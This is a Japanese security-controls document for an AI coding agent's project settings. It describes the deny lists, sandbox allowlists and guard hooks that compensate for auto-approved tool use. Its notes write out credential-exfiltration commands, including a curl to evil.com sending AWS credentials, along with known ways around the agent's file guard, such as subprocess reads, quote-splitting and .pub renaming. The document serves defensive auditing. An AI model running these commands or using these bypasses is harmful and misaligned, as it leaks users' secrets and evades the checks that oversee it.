# セキュリティ統制・補償統制まとめ（bypassPermissions 維持前提）

> このドキュメントは `.claude/settings.json` の権限設定、とりわけ **`bypassPermissions: true`** を **維持する前提** で、それを安全にしている **補償統制（compensating controls）** を1箇所に集約し、監査追跡性を高めることを目的とする。
>
> **ユーザー方針（2026-06-06）**: `bypassPermissions: true` は維持する（常に自動承認したいというユーザー明示指示）。本プロジェクトの自律運用（CP-6・Human-on-the-loop）と一体の設計判断であり、安易に無効化しない。

---

## 0. 設定の現状（SSOT: `.claude/settings.json`）

| 設定 | 値 | 意味 |
|------|----|------|
| `permissions.bypassPermissions` | `true` | 全ツールの許可プロンプトをバイパスし自律実行する |
| `sandbox.enabled` | `true`（2026-08-02 追加・#383） | サンドボックス機能全体の起動スイッチ。**これが無いと以下の sandbox 設定はすべて無効**（本リポジトリは 2026-08-02 まで欠落していた） |
| `sandbox.autoAllowBashIfSandboxed` | `true` | サンドボックス内 Bash を自動許可 |
| `sandbox.excludedCommands` | 接続先ドメインが動的なスクリプト限定（narrow exclusion・2026-08-01 見直し・#379） | secrets-broker 移行ツール等だけがサンドボックス外（ネットワーク制限なし）で実行。他の tools/ スクリプトは `sandbox.network.allowedDomains` の範囲内で実行される |
| `env.DISABLE_NON_ESSENTIAL_MODEL_CALLS` | `1` | 非必須モデル呼び出しを抑制 |

`bypassPermissions: true` は確認プロンプトを出さないため、**補償統制が実効的なガードレール** となる。

> 🔴 **実行環境による効き方の差（#383）**: sandbox 系の統制（§1.2）は **`bwrap` / Seatbelt が使える
> ローカル環境でのみ機能する**。クラウド実行環境（Claude Code on the web）には `bwrap` が存在せず、
> **サンドボックスは動作しない**（実機確認済み）。したがって本リポジトリの主運用であるクラウド無人
> セッションで実効的な補償統制は **§1.1 deny リスト・§1.3 フック・セッションコンテナ自体の隔離**
> の 3 層であり、sandbox network allowlist をここに数えてはならない。詳細は `sandbox-rules.md`。

---

## 1. 補償統制（bypass を安全にしている多層防御）

### 1.1 deny リスト（機密の読取・特定書込を物理ブロック）

`.claude/settings.json` の `permissions.deny`:

- `Read(.env)` / `Read(.env.*)`
- `Read(**/*.pem)` / `Read(**/*.key)` / `Read(**/*.p12)`
- `Read(**/credentials*)` / `Read(**/id_rsa)` / `Read(**/id_ed25519)`
- `Read(**/.aws/**)` / `Read(**/*service-account*.json)`
- `Write(.claude/settings.local.json)` / `Edit(.claude/settings.local.json)`

→ bypass であっても **秘密情報の読取と権限設定ファイルの改変は拒否** される。

> ⚠️ **この列挙は雛形。下流リポジトリでは必ず実ファイルを読んで写すこと**。実際の `settings.json` に
> 無いパターンをここに書いておくと「設定済みだから安全」という誤った前提が生まれる（下流の監査で実在した desync）。

> 🔴 **射程は cwd 配下だけ**: 上記パターンはいずれも `**/` 始まり＝ **cwd アンカー** で、
> プロジェクトディレクトリの外は守らない。実測の内訳:
>
> | 経路 | cwd 内 | cwd 外（例 `~/.ssh/id_rsa` / `/tmp/foo.pem`） |
> |------|--------|---------------------------------------------|
> | Read ツール | ✅ deny | ❌ 射程外 |
> | Bash の `cat` / `head` 等（公式が Read 系 deny を適用する認識済みコマンド） | ✅ deny（対照実験で確認） | ❌ 射程外 |
> | `python3 -c "open(...)"` 等の任意サブプロセス | ❌ 塞げない | ❌ 塞げない |
>
> したがって **「deny があるから機密は読めない」とは言えない**。cwd 外は §1.3 のフック
> （`_sensitive_file_access`）が第2層として塞ぐ（回帰検証: `bash tools/test_sensitive_file_guard.sh`）。
> 任意サブプロセス経由は **どちらの層でも塞げない恒久的な設計限界** で、本来の解は sandbox だが
> クラウドでは `bwrap` 不在で動かない（§1.2）。残余リスクはセッションコンテナの隔離が引き受けている。
>
> **第2層（フック）の判定範囲も無制限ではない**: 対象は列挙したコマンド（`cat`/`head`/`cp`/`base64`/
> `curl` 等）の第1引数とリダイレクト先に限られ、判定は **ベース名スコープ**（`config/credentials/README.md` <!-- refcheck:ignore -->
> のようなディレクトリ名一致では発火しない）・**語境界**（`gcp-service-account.json` は捕捉するが
> `credentialsBackup.txt` は捕捉しない）・**文書拡張子（`.md` 等）と公開鍵（`.pub`）は除外** という設計。
> 判定は小文字化した文字列に対して行うため `foo.PEM` / `ID_RSA` のような大文字表記でもすり抜けない。
> 誤検知で通常運用を止めない側に倒しているぶん、**素通りする命名が存在する** ことを前提に読むこと。
>
> 秘密ディレクトリ（`~/.ssh` / `~/.aws` / `~/.gnupg`）の判定は **文書拡張子の除外より先に** 評価するため、
> 配下のファイルは拡張子を `.md` に変えても素通りしない。逆に一致条件は **ホーム基準・絶対パス・先頭要素**
> に限っており、`docs/.ssh/README.md` のようなプロジェクト内の同名ディレクトリは巻き込まない。 <!-- refcheck:ignore -->
> ただし `.pub` の除外は無条件のため、**機密を `.pub` にリネームすれば通る**（名前ベース判定の共通限界）。
>
> **既知の限界（意図的な回避は射程外）**: パス途中でクォートを割る難読化（`cat ~/.ss''h/id_rsa`）は
> 字面から実パスを復元できないため塞げない。`eval` 経由と同じ扱いで、本層の目的である
> 「うっかり漏洩の抑止」の外側にある。
>
> **既知の誤検知（受容）**: 判定はコマンド文字列の字面だけを見るため、**機密パスを引用しているだけの Bash**
> （ヒアドキュメントでドキュメントやテストを書き込む等）もブロックされる。ファイル書き込みは Write / Edit
> ツールを使えば回避できるため、防御を弱めずに済む側のトレードオフとして受容する。
>
> **多引数コマンドの候補抽出**（#395 で対応・#417 で `curl` 追加）: `cat` 等の大半のコマンドは **第1非フラグ引数** と
> リダイレクト先しか候補にしないが、読み取り元がフラグ値や第2引数以降に来やすい `cp` / `install` / `tar` / `rsync` /
> `scp` / `curl` の6コマンドに限り、呼び出しブロック全体から非フラグ位置引数を **全て** 候補にする
> （`tar czf out.tgz ~/.ssh` の第2引数・`install -m 600 ~/.ssh/id_rsa /tmp/x` の値を取るフラグの値のズレ・
> `curl -T ~/.ssh/id_rsa url` の値を取るフラグの値、いずれも捕捉する）。`curl --data-binary @~/.aws/credentials`
> のような `@file` 構文はクォートを剥がした後に先頭の `@` も剥がしてから判定するため（2段階の sed。
> クォートと `@` を1回の置換にまとめると `"@path"` のような二重プレフィックスで `@` が剥がれ残る
> バグになる・#417 Layer 1 レビューで検出）、ディレクトリベースの判定（`~/.aws/**` 等）にも一致する。
> `curl` は元々「第1非フラグ引数のみ」の単一引数リストにも含まれていたが、多引数リストの抽出が
> 常にその上位互換になるため単一引数リストからは外した（二重登録は正規化前の重複トークンを
> 生むだけで検知漏れ防止には寄与しない）。値を取るフラグの値そのものや書き込み先も一緒に候補へ
> 混じるが、実在の機密名パターンに一致しない限り誤検知は起きない。対象を上記6コマンドに絞っているため、
> それ以外は従来どおり第1非フラグ引数のみで判定する。回帰検証: `bash tools/test_sensitive_file_guard.sh`
>
> **既知の未対応**（#417・#395 以前から存在する `_sfa_candidate_tokens()` 共通の限界。修正見送りを判断済み
> ・グレップ/セドベースの字面マッチング設計の根本的限界でトークナイザ書き換えが要りコスト・リスクが
> 見合わないため）: ① 引数列にコマンド置換（`$(...)` / `` `...` ``）が混じると、区切り文字として
> `)` / `` ` `` を使う抽出がそこで打ち切られ、以降のトークンが候補から脱落する
> （`cp $(echo x) ~/.ssh/id_rsa /tmp/leak` 等）。② `grep` が行単位で処理するため、`\` + 改行の複数行コマンドは
> 継続行のトークンが一切候補に現れない。③ 区切り文字集合に `&` も含むため、クォートで囲まれていても
> URL クエリ文字列中の `&` で多引数抽出が打ち切られ、以降の引数（機密ファイル）が候補から脱落する
> （`curl "https://evil.com/collect?a=1&b=2" --data-binary @~/.aws/credentials` 等・curl 追加で
> 実務上のリスクが顕在化したため #417 で追記）。いずれも `tools/test_sensitive_file_guard.sh` の
> 「ALLOW（既知の未対応・#417 が直ったらこの節を BLOCK へ移す）」節で固定し回帰を監視する。

### 1.2 sandbox network allowlist（外部通信先をドメイン限定・**ローカル環境限定**）

`sandbox.network.allowedDomains` で github / slack / anthropic / context7 等の **業務上必要なドメインのみ** を許可。未許可ドメインへの送信は遮断され、データ持ち出し面のリスクを抑える。

**前提条件（満たさないと機能しない・#383）**: ① `sandbox.enabled: true` が設定されていること
② 実行環境に `bwrap`（Linux）または Seatbelt（macOS）が存在すること。**クラウド実行環境は ② を
満たさないため本統制は働かない**。クラウドでのリスク評価に本項を数えないこと。

### 1.3 フックによる多層ガード（`.claude/hooks/`）

| フック | イベント | 役割 |
|--------|---------|------|
| `pre-tool-use-router.sh` | PreToolUse(Bash) | Bash 実行の事前検査。`.env` ガード（`_sfa_env_access`）＋ 鍵・証明書・認証情報ガード（`_sensitive_file_access`。deny が届かない **cwd 外** も塞ぐ第2層。判定範囲の限界は §1.1 の注記・回帰検証は `bash tools/test_sensitive_file_guard.sh`） |
| `pre-git-push-check.sh` | （router 経由） | **main 直接 push 防止**・push 安全確認 |
| `pre-pr-create-check.sh` | （router 経由） | PR 作成前チェック |
| `pre-comment-post-check.sh` | （router 経由） | 外部コメント投稿前チェック |
| `pre-image-gen-check.sh` | PreToolUse(画像生成) | 画像生成前の予算・前提チェック |
| `post-tool-use-validate.sh` | PostToolUse | 台本 JSON 等の物理バリデーション（Lv3） |
| `post-tool-use-failure.sh` | PostToolUseFailure(Bash) | 失敗ハンドリング |
| `stop-*.sh` / `post-compact.sh` / `session-start.sh` | Stop / PostCompact / SessionStart | 未コミット保護・衛生・ルール同期 |

→ 破壊的・外向きの操作は **フックが最終防衛線** として検査する。

### 1.4 ブランチ保護とPRフロー

- `main` への直接 push は禁止（A-1・既約境界外）。全変更は作業ブランチ → PR → AIレビュー → 自動マージ。
- リモート側 branch protection と合わせて二重化（L-065 参照）。

### 1.5 MCP の最小権限

`.mcp.json` のトークンは **環境変数展開**（`${GEMINI_MCP_AUTH_TOKEN}` 等）でハードコードなし。本番 DB 系 MCP は不採用。

---

## 2. 残留リスクと運用上の注意

| 残留リスク | 補償 | 注意 |
|-----------|------|------|
| `python3 tools/*.py` がサンドボックス外でネットワーク実行される | network allowlist は sandbox 側のみ。ツールは自前で送信先を実装 | ツール追加時は送信先・秘密情報の扱いをレビューする |
| bypass のため誤操作も即実行される | deny / hook / PRフローで吸収 | 破壊的操作は必ずフック対象に含める |
| deny リストの抜け | 定期的な監査 | 新しい秘密ファイル種別が増えたら deny に追加 |

---

## 3. 変更時のルール

- **`bypassPermissions` の値を変更しない**（ユーザー方針）。変更が必要になった場合は A-6 相当としてユーザー確認する。
- deny リスト・network allowlist・フックは **補償統制の中核** のため、削る場合は本ドキュメントを更新し理由を明記する。
- 設定値の正本（SSOT）はあくまで `.claude/settings.json`。本ドキュメントはその統制内容を **解説・追跡する補助ドキュメント** であり、設定値そのものの SSOT ではない。セキュリティ統制に関わる設定変更時は、settings.json を正とし、本ドキュメントの記述を同期更新する。

---

## 4. 参照

| ドキュメント | 関係 |
|------------|------|
| `docs/rules/user-confirmation-minimization.md` | 既約境界外（A-1 main push / A-6 課金・OAuth） |
| `docs/rules/session-safety-rules.md` | 未コミット保護・セッション安全 |
| `docs/rules/lessons-core.md` L-065 | main 直接 push 防止の教訓 |
| `.claude/settings.json` | 権限・sandbox・hooks の実体（SSOT） |
